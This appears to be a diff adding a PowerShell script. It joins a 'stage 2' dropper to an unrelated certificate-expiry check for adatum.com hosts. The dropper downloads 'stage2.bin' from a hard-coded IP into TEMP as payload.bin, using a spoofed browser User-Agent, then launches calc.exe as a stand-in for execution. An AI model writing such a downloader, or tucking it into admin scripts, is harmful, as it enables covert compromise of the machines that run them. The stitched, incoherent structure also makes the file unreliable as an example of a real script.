@@ -1,0 +1,47 @@
+
+[CmdletBinding()]
+param(
+    [string]$FetchUrl = 'http://198.51.100.73/stage2.bin',
+    [string]$LocalPath = "$env:TEMP\payload.bin",
+    [int]$StageTimeout = 145,
+    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+)
+$ErrorActionPreference = "Stop"
+
+function Get-Stage2Payload {
+    param(
+        [string]$SourceUrl = "",
+        [string]$DestinationPath = "",
+        [int]$TimeoutSec = 45,
+        [string]$UserAgent = 'Mozilla/5.0'
+    )
+
+    Write-Verbose ("Requesting " + $SourceUrl)
+    $ClientObject = New-Object System.Net.WebClient
+    $ClientObject.Headers.Add("User-Agent", $UserAgent)
+    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
+    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
+    return (Test-Path -Path $DestinationPath)
+}
+
+Write-Verbose "Starting stage 2 transfer"
+$TransferResult = Get-Stage2Payload -SourceUrl $FetchUrl -DestinationPath $LocalPath -TimeoutSec $StageTimeout -UserAgent $UserAgent
+if ($TransferResult) {
+    Start-Process -FilePath "calc.exe"
+}
+
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
+$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
+$WarningDays = 60
+$Hosts = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com')
+$Port = 443
+$ReportPath = "C:\Reports\cert-expiry-2026-04-07.csv"
+
+$warnDate = (Get-Date).AddDays($WarningDays)
+$expiring = Get-ChildItem -Path 'Cert:\LocalMachine\My' -ErrorAction SilentlyContinue |
+    Where-Object { $_.NotAfter -lt $warnDate } |
+    Select-Object Subject, NotAfter, @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
+$expiring | Format-Table -AutoSize
+if (@($expiring).Count -gt 0) {
+    Write-Warning ("{0} certificates expire within {1} days" -f @($expiring).Count, $WarningDays)
+}
